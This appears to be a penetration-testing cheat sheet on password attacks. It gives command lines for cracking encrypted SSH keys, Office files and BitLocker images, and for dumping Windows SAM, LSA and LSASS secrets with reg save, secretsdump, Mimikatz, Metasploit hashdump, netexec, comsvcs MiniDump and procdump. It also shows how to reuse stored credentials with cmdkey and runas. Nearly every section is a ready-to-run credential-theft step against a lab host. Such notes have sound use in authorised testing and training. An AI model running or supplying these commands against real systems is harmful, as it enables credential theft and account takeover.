# Password Attacks

## Identify Hashes

### 1. Using hashid

<figure><img src="../.gitbook/assets/image (1630).png" alt=""><figcaption></figcaption></figure>

### 2. Using hash-identifier&#x20;

<figure><img src="../.gitbook/assets/image (1631).png" alt=""><figcaption></figcaption></figure>

### 3. Using Name-That-Hash&#x20;

<figure><img src="../.gitbook/assets/image (1632).png" alt=""><figcaption></figcaption></figure>

## Cracking Protected Files&#x20;

### Hash Convertors&#x20;

{% code overflow="wrap" %}
```bash
locate *2john*
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (1634).png" alt=""><figcaption></figcaption></figure>

### Crack Encrypted SSH Keys

{% code overflow="wrap" %}
```bash
ssh2john ssh_key > ssh_hash
john ssh_hash --wordlist=<wordlist>
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (1633).png" alt=""><figcaption></figcaption></figure>

### Crack Encrypted Excel File&#x20;

{% code overflow="wrap" %}
```
office2john Confidential.docx > file.hash
john file.hash --wordlist=<wordlist>
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (1635).png" alt=""><figcaption></figcaption></figure>

### Crack Encrypted Drives&#x20;

#### Identify hash&#x20;

<figure><img src="../.gitbook/assets/image (1636).png" alt=""><figcaption></figcaption></figure>

#### Cracking the hash&#x20;

<figure><img src="../.gitbook/assets/image (1637).png" alt=""><figcaption></figcaption></figure>

#### Mounting Encrypted bitlocker drive in Linux&#x20;

{% code overflow="wrap" %}
```
sudo mkdir -p /media/bitlockermount
sudo mkdir -p /media/bitlocker
sudo losetup -f -P Private.vhd
losetup -a
lsblk
sudo dislocker /dev/loop1p1 -ufrancisco -- /media/bitlocker
sudo mount -t ntfs-3g -o loop /media/bitlocker/dislocker-file /media/bitlockermount
ls -l /media/bitlockermount
cat /media/bitlockermount/flag.txt
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (1638).png" alt=""><figcaption></figcaption></figure>

## Dumping SAM Hashes

### Using Registry Editor

#### 1. Copying Registry Hives

{% code overflow="wrap" %}
```cmd
reg.exe save hklm\sam C:\sam.save
reg.exe save hklm\system C:\system.save
reg.exe save hklm\security C:\security.save
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (1646).png" alt=""><figcaption></figcaption></figure>

#### 2. Dumping Hashes

1. **Using impacket-secretsdump**

{% code overflow="wrap" %}
```bash
impacket-secretsdump -sam ./sam -security ./security -system ./system LOCAL
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (1647).png" alt=""><figcaption></figcaption></figure>



2. **Using samdump2**

{% code overflow="wrap" %}
```bash
samdump2 system sam
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (1648).png" alt=""><figcaption></figcaption></figure>

### **Using pwdump8**

{% code overflow="wrap" %}
```bash
pwdump8.exe
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (1651).png" alt=""><figcaption></figcaption></figure>

### Using impacket-secretsdump (best)

{% code overflow="wrap" %}
```bash
impacket-secretsdump arjun@192.168.16.132
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (1652).png" alt=""><figcaption></figcaption></figure>

### Using Invoke-PowerDump.ps1

{% code overflow="wrap" %}
```powershell
Set-ExecutionPolicy Bypass -Scope Process -Force
.\Invoke-PowerDump.ps1
Invoke-PowerDump
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (1653).png" alt=""><figcaption></figcaption></figure>

### Using Mimikatz&#x20;

{% code overflow="wrap" %}
```cmd
privilege::debug
token::elevate
lsadump::sam
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (1654).png" alt=""><figcaption></figcaption></figure>

### Using Metasploit&#x20;

1. **Using smart\_hashdump**

{% code overflow="wrap" %}
```bash
use post/windows/gather/smart_hashdump
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (1655).png" alt=""><figcaption></figcaption></figure>

2. **Using hashdump**&#x20;

{% code overflow="wrap" %}
```bash
use post/windows/gather/hashdump
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (1656).png" alt=""><figcaption></figcaption></figure>

### Using nxc

{% code overflow="wrap" %}
```bash
netexec smb 192.168.16.132 -u arjun -p 'P@$$w0rd' --sam
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (1657).png" alt=""><figcaption></figcaption></figure>

### Dump LSA (nxc)

{% code overflow="wrap" %}
```bash
netexec smb 192.168.16.132 -u arjun -p 'P@$$w0rd' --lsa
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (1658).png" alt=""><figcaption></figcaption></figure>

## Cracking SAM hashes&#x20;

### Using John (JtR)

{% code overflow="wrap" %}
```bash
john --format=NT sam_hashes.txt /usr/share/wordlists/rockyou.txt
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (1649).png" alt=""><figcaption></figcaption></figure>

### Using Hashcat&#x20;

{% code overflow="wrap" %}
```bash
hashcat -m 1000 sam.hashes /usr/share/wordlists/rockyou.txt
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (1650).png" alt=""><figcaption></figcaption></figure>

## Dumping LSASS Process Memory&#x20;

### Using Task Manager

1. Open `Task Manager`
2. Select the `Processes` tab
3. Find and right click the `Local Security Authority Process`
4. Select `Create dump file`

<figure><img src="../.gitbook/assets/image (1659).png" alt=""><figcaption></figcaption></figure>

### Using Rundll32.exe & Comsvcs.dll&#x20;

#### Finding LSASS's PID&#x20;

1. **Using cmd :** `tasklist /svc | findstr lsass`

<figure><img src="../.gitbook/assets/image (1660).png" alt=""><figcaption></figcaption></figure>

2. **Using PowerShell: `Get-Process lsass`**

<figure><img src="../.gitbook/assets/image (1661).png" alt=""><figcaption></figcaption></figure>

#### Creating a dump file using PowerShell&#x20;

**With an elevated PowerShell session, we can issue the following command to create a dump file:**

{% code overflow="wrap" %}
```
rundll32 C:\windows\system32\comsvcs.dll, MiniDump 736 C:\lsass.dmp full
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (1663).png" alt=""><figcaption></figcaption></figure>

With this command, we are running `rundll32.exe` to call an exported function of `comsvcs.dll` which also calls the MiniDumpWriteDump (`MiniDump`) function to dump the LSASS process memory to a specified directory (`C:\lsass.dmp`).

### Using Sysinternals ProcDump&#x20;

{% code overflow="wrap" %}
```
# Run as Administrator
procdump.exe -ma lsass.exe lsass.dmp
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (1664).png" alt=""><figcaption></figcaption></figure>

## Extracting Credentials from Lsass

### Using pypykatz&#x20;

{% code overflow="wrap" %}
```bash
pypykatz lsa minidump lsass.dmp
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (1665).png" alt=""><figcaption></figcaption></figure>

### Using mimikatz (Windows Directly)

{% code overflow="wrap" %}
```
mimikatz.exe 
privilege::debug
token::elevate
sekurlsa::logonpasswords
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (1666).png" alt=""><figcaption></figcaption></figure>

### Cracking NT Hash (found in LSASS)

<figure><img src="../.gitbook/assets/image (1668).png" alt=""><figcaption></figcaption></figure>

## Enumerating Credentials Manager&#x20;

### Using cmdkey&#x20;

{% code overflow="wrap" %}
```
cmdkey /list
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (1676).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
_This thing can also be viewed from the credentials manager in the GUI. and we can change it if we've admin permissions._&#x20;
{% endhint %}

### Use stored credentials

{% code overflow="wrap" %}
```
cmdkey /list
runas /savecred /user:SRV01\mcharles cmd
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (1674).png" alt=""><figcaption></figcaption></figure>

### Extracting credentials with Mimikatz&#x20;

{% code overflow="wrap" %}
```
mimikatz.exe
privilege::debug
sekurlsa::credman
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (1677).png" alt=""><figcaption></figcaption></figure>
